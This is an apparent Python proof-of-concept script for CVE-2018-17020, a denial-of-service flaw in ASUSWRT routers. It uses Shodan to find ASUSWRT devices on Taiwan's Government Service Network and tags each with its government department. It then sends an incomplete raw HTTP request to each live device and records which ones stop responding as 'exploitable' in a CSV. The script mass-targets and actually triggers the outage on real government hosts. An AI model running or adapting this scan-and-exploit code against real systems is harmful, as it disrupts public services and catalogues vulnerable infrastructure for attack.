"""Module Proof of Concept for CVE-2018-17020."""
import os
import socket
import sys

import pandas as pd
import requests

import helper.function as func
from package.shodan_adapter import ShodanAdapter
from package.ip2gov_adapter import Ip2govAdapter

ACCESSIBLE_CODES = [200, 401]


def get_response_code(request_url):
    """Function get http status code."""
    try:
        response = requests.get(request_url, allow_redirects=True, timeout=5)
        return response.status_code
    except Exception as e:
        print(e)
        return False


def is_accessible(request_url):
    """Function confirm that web service is accessible."""
    code = get_response_code(request_url)
    if code not in ACCESSIBLE_CODES:
        return False

    return True


if __name__ == '__main__':

    ip2gov = Ip2govAdapter()
    sa = ShodanAdapter()
    search_filters = {
        'country': 'tw',
        'org': "Government Service Network (GSN)",
        'os': 'ASUSWRT',
    }

    match_fields = [
        {'label': 'ip', 'field': 'ip_str'},
        {'label': 'port', 'field': 'port'},
    ]

    services = sa.basic_query(search_filters, match_fields)
    print(services)

    output = []
    for service in services:
        EXPLOITABLE = False
        host = service['ip']
        port = service['port']
        print(host, port)

        if port == 80:
            url = f"http://{host}"
        else: 
            url = f"http://{host}:{port}"

        gov_data = ip2gov.get_gov_data_by_ip(service['ip'])
        if gov_data:
            dep = gov_data.get('DEP')
        else:
            dep = None

        FIRST_VISIT = is_accessible(url)
        print(f"first_visit: {FIRST_VISIT}")

        if not FIRST_VISIT:
            print("exit")
            output.append(service | {'department': dep} | {'exploitable': EXPLOITABLE})
            #output.append(service | {'exploitable': EXPLOITABLE})
            continue

        print('start socket')
        # Create a socket object
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Connect to the server
        client_socket.connect((host, port))

        # Prepare the raw HTTP request
        HTTP_REQUEST = 'GET / HTTP/1.1\r\n'

        # Send the request to the server
        print(f"send request: {HTTP_REQUEST}")
        client_socket.send(HTTP_REQUEST.encode())

        SECOND_VISIT = is_accessible(url)
        print(f"second_visit: {SECOND_VISIT}")

        if SECOND_VISIT:
            print("exploitable: False")
        else:
            EXPLOITABLE = True
            print("exploitable: True")

        # Close the socket
        client_socket.close()
        print('close socket')

        #output.append(service | {'exploitable': EXPLOITABLE})
        output.append(service | {'department': dep} | {'exploitable': EXPLOITABLE})

    output_dict = func.arr_dict_to_flat_dict(output)
    df = pd.DataFrame(output_dict)
    path_to_csv = os.path.join(os.path.dirname(__file__), "data", "use_cve_2018_17020.csv")
    df.to_csv(path_to_csv, index=False)
